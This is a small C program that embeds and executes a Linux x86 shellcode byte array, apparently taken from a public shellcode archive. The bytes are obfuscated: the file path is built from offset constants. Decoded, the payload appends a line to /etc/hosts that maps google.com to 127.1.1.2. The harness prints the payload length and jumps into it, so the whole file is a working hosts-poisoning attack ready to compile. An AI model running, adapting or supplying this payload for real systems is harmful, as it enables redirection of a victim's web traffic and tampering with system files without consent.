// Original shellcode: http://shell-storm.org/shellcode/files/shellcode-893.php

char shellcode[] =
"\x31\xc0\x99\x04\x05\x52\xbe\x10\x10\x10\x10\xb9\x5f\x63\x64\x63\x01\xf1\x51\xb9\x1f\x1f\x1f\x58\x01\xf1\x51\xb9\x1f\x55\x64\x53\x01\xf1\x51\x89\xe3\x87\xca\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x21\x59\xc7\x01\x31\x32\x37\x2e\xc7\x41\x04\x31\x2e\x31\x2e\xc6\x41\x08\x32\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xda\xff\xff\xff\x78\x78\x78\x78\x78\x2e\x78\x2e\x78\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";

	
int main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
